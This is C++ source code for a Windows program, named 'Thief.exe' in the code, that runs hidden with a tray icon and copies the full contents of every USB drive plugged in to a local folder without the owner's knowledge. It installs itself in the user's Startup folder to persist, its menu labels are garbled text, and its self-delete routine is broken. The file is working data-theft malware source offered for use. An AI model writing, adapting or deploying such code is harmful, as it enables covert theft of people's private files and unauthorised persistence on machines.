#include <bits/stdc++.h>
#include <windows.h>
#include <stdio.h>
#include <dbt.h>
#include <shlwapi.h>
#include <cstring>
#pragma comment(lib, "shlwapi.lib")
#include <string>
#include <shlobj.h>
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#define IDR_PAUSE 1001
#define IDR_START 1002
#define IDR_CHANGE_DIR 1003
#define IDR_SHOW_DIR 1004
#define IDR_DIE 1005

//
// powered by zmx
// 

LPCTSTR szAppClassName  = TEXT("ϵͳ�������");
LPCTSTR szAppWindowName = TEXT("ϵͳ�������");
HMENU hmenu;
std::string targetBasePath = "D:\\Public_USB";
std::string BrowseForFolder(HWND hwnd)
{
    BROWSEINFO bi = { 0 };
    bi.lpszTitle = TEXT("��ѡ��Ŀ��Ŀ¼");
    bi.ulFlags = BIF_RETURNONLYFSDIRS | BIF_NEWDIALOGSTYLE;
    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);
    
    if (pidl != NULL)
    {
        TCHAR path[MAX_PATH];
        SHGetPathFromIDList(pidl, path);
        
        IMalloc * imalloc = 0;
        if (SUCCEEDED(SHGetMalloc(&imalloc)))
        {
            imalloc->Free(pidl);
            imalloc->Release();
        }
        
        #ifdef UNICODE
        std::wstring wstr(path);
        return std::string(wstr.begin(), wstr.end());
        #else
        return std::string(path);
        #endif
    }
    return "";
}

bool IsDiskSpaceAvailable(const std::string& targetPath, DWORDLONG requiredSpace = 1ULL * 1024 * 1024 * 1024) {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (!GetDiskFreeSpaceExA(targetPath.c_str(), &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
        abort();
        return false;
    }
    return (freeBytesAvailable.QuadPart >= requiredSpace);
}

void CopyFilesFromUSB(const std::string& sourcePath, const std::string& targetPath) {
    if (!IsDiskSpaceAvailable(targetPath)) {
        return;
    }

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((sourcePath + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }

        std::string sourceFilePath = sourcePath + "\\" + findFileData.cFileName;
        std::string targetFilePath = targetPath + "\\" + findFileData.cFileName;

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!CreateDirectoryA(targetFilePath.c_str(), NULL)) {
                if (GetLastError() != ERROR_ALREADY_EXISTS) {
                    continue;
                }
            }
            if (!IsDiskSpaceAvailable(targetPath)) {
                break;
            }
            CopyFilesFromUSB(sourceFilePath, targetFilePath);
        } else {
            LARGE_INTEGER fileSize;
            HANDLE hFile = CreateFileA(sourceFilePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                GetFileSizeEx(hFile, &fileSize);
                CloseHandle(hFile);

                if (!IsDiskSpaceAvailable(targetPath, fileSize.QuadPart + 1024ULL * 1024 * 1024)) {
                    continue;
                }
            }
            CopyFileA(sourceFilePath.c_str(), targetFilePath.c_str(), TRUE);
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void DeleteAppSelf()
{
	char szCommandLine[MAX_PATH + 10] = { 0 };
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	SetThreadPriority(GetCurrentProcess(), THREAD_PRIORITY_TIME_CRITICAL);
	SHChangeNotify(SHCNE_DELETE, SHCNF_PATH, _pgmptr, NULL);
	char szFilePath[MAX_PATH] = { 0 };
	sprintf(szFilePath, R"(%s)", _pgmptr);
	sprintf(szCommandLine, "/c del /q %s", szFilePath);
	char* username;
    char destinationPath[MAX_PATH];
	username = getenv("USERPROFILE");
	snprintf(destinationPath, sizeof(destinationPath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Thief.exe", username);
	ShellExecuteA(NULL, "open", "cmd.exe", destinationPath, NULL, SW_HIDE);
	ExitProcess(0);
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    static NOTIFYICONDATA nid;
    static UINT WM_TASKBARCREATED;
    POINT pt;
    int xx;

    WM_TASKBARCREATED = RegisterWindowMessage(TEXT("TaskbarCreated"));
    
    switch (message)
    {
    case WM_CREATE:
        nid.cbSize = sizeof(nid);
        nid.hWnd = hwnd;
        nid.uID = 0;
        nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
        nid.uCallbackMessage = WM_USER;
        nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);
        lstrcpy(nid.szTip, TEXT("ϵͳ����"));
        Shell_NotifyIcon(NIM_ADD, &nid);
        
        hmenu = CreatePopupMenu();
        
        AppendMenu(hmenu, MF_STRING, IDR_CHANGE_DIR, TEXT("�޸�Ŀ¼..."));
        AppendMenu(hmenu, MF_STRING, IDR_SHOW_DIR, TEXT("��ǰĿ¼"));
        AppendMenu(hmenu, MF_SEPARATOR, 0, NULL);
        AppendMenu(hmenu, MF_STRING, IDR_START, TEXT("����"));
        AppendMenu(hmenu, MF_STRING, IDR_PAUSE, TEXT("��ͣ����"));
        AppendMenu(hmenu, MF_STRING, IDR_DIE, TEXT("���ٷ���"));
        break;
        
    case WM_USER:
    if (lParam == WM_LBUTTONDBLCLK)
        SendMessage(hwnd, WM_CLOSE, wParam, lParam);
    if (lParam == WM_RBUTTONDOWN)
    {
        GetCursorPos(&pt);
        ::SetForegroundWindow(hwnd);
        xx = TrackPopupMenu(hmenu, TPM_RETURNCMD, pt.x, pt.y, 0, hwnd, NULL);
        
        if (xx == IDR_PAUSE) 
            SendMessage(hwnd, WM_CLOSE, wParam, lParam);
        else if (xx == IDR_START) 
            MessageBox(hwnd, TEXT("�汾 v2.1\n����: 114514"), szAppClassName, MB_OK);
        else if (xx == IDR_CHANGE_DIR)
        {
            std::string newPath = BrowseForFolder(hwnd);
            if (!newPath.empty())
            {
                targetBasePath = newPath; // std::string ���Զ������ڴ�
                LPCSTR filepath = targetBasePath.c_str(); // �����ͷţ��� targetBasePath ����
                
                // ����ļ�����Ƿ���Ҫ�ر�
                HANDLE hFile = CreateFileA(
                    filepath, 
                    GENERIC_READ, 
                    FILE_SHARE_READ, 
                    NULL, 
                    OPEN_EXISTING, 
                    FILE_ATTRIBUTE_NORMAL, 
                    NULL
                );
                
                if (hFile != INVALID_HANDLE_VALUE)
                    CloseHandle(hFile); // �ر��ļ������ֹй©
                
                MessageBox(hwnd, TEXT("����Ŀ¼�ѱ��"), szAppClassName, MB_OK);
            }
        }
        else if (xx == IDR_SHOW_DIR)
        {
            // ֱ��ʹ�� c_str()����������ڴ����
            MessageBoxA(hwnd, targetBasePath.c_str(), szAppClassName, MB_OK);
        }
        else if (xx == IDR_DIE)
        {
            DeleteAppSelf();
        }
    }
    break;
        
    case WM_DEVICECHANGE:
        if (wParam == DBT_DEVICEARRIVAL) {
            PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
            if (pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                for (int i = 0; i < 26; i++) {
                    char driveLetter = 'A' + i;
                    std::string drivePath = std::string(1, driveLetter) + ":\\";
                    UINT driveType = GetDriveTypeA(drivePath.c_str());
                    if (driveType == DRIVE_CDROM || (driveType == DRIVE_REMOVABLE && (driveLetter == 'A' || driveLetter == 'B'))) {
                        continue;
                    }
                    if (driveType == DRIVE_REMOVABLE) {
                        char volumeName[MAX_PATH + 1] = { 0 };
                        if (!GetVolumeInformationA(drivePath.c_str(), volumeName, MAX_PATH, NULL, NULL, NULL, NULL, 0)) {
                            strncpy(volumeName, "USB_Drive", MAX_PATH);
                            volumeName[MAX_PATH - 1] = '\0';
                        }
                        std::string targetPath = targetBasePath + "\\" + std::string(volumeName);
                        if (!CreateDirectoryA(targetPath.c_str(), NULL)) {
                            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                                continue;
                            }
                        }
                        CopyFilesFromUSB(drivePath, targetPath);
                    }
                }
            }
        }
        break;
        
    case WM_DESTROY:
    	Shell_NotifyIcon(NIM_DELETE, &nid);
    	DestroyMenu(hmenu);  // �ͷŲ˵���Դ
    	PostQuitMessage(0);
    	break;
        
    default:
        if (message == WM_TASKBARCREATED)
            SendMessage(hwnd, WM_CREATE, wParam, lParam);
        break;
    }
    return DefWindowProc(hwnd, message, wParam, lParam);
}

void HKRunator(char *programName)
{
	char* username;
    char destinationPath[MAX_PATH];
	username = getenv("USERPROFILE");
	snprintf(destinationPath, sizeof(destinationPath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Thief.exe", username);
	CopyFileA(programName, destinationPath, FALSE);
}

int main() {
	char szSelfName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    HKRunator(szSelfName);
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "USBDetect";
    if (!RegisterClass(&wc)) {
        return 1;
    }
    HWND hWnd = CreateWindow("USBDetect", "USBDetect", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 
                             CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
    if (!hWnd) {
        return 1;
    }
    ShowWindow(hWnd, SW_HIDE); 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
